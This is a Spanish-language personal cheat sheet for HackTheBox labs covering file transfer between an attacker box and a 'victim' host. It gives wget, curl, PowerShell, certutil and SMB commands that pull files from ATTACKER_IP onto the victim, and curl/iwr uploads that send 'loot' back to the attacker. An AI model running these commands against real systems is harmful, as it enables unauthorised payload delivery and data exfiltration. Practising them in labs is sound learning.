---
title: Transfers
tags: [htb, snippets, file-transfer]
created: 2026-04-29
related:
  - "[[HTB/snippets/reverse-shells|Reverse Shells]]"
  - "[[HTB/snippets/one-liners|One-liners]]"
---

# Transfers

> [!abstract] TL;DR
> Formas rápidas de mover archivos en HTB. Siempre validar arquitectura, permisos y ruta escribible.

## HTTP server

Atacante:

```bash
python3 -m http.server 8000
```

Linux víctima:

```bash
wget http://ATTACKER_IP:8000/file -O /tmp/file
curl http://ATTACKER_IP:8000/file -o /tmp/file
```

Windows víctima:

```powershell
iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\Windows\Temp\file.exe
```

```cmd
certutil -urlcache -f http://ATTACKER_IP:8000/file.exe C:\Windows\Temp\file.exe
```

## SMB server

Atacante:

```bash
impacket-smbserver share . -smb2support
```

Windows víctima:

```cmd
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe
```

Con usuario:

```bash
impacket-smbserver share . -smb2support -username user -password pass
```

```cmd
net use \\ATTACKER_IP\share /user:user pass
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe
```

## Upload desde víctima

Atacante:

```bash
python3 -m uploadserver 8000
```

Linux:

```bash
curl -F 'files=@loot.txt' http://ATTACKER_IP:8000/upload
```

Windows:

```powershell
iwr -Method Post -InFile loot.txt http://ATTACKER_IP:8000/upload
```

## Base64 fallback

Linux encode:

```bash
base64 file -w0
```

Linux decode:

```bash
echo BASE64_HERE | base64 -d > file
```

Windows decode:

```powershell
[IO.File]::WriteAllBytes("C:\Windows\Temp\file.bin",[Convert]::FromBase64String("BASE64_HERE"))
```

## Checklist

```text
[ ] Ruta escribible
[ ] Arquitectura x86/x64 correcta
[ ] AV/Defender puede borrar binarios
[ ] Hash/tamaño validado
[ ] Permiso de ejecución aplicado si es Linux
```
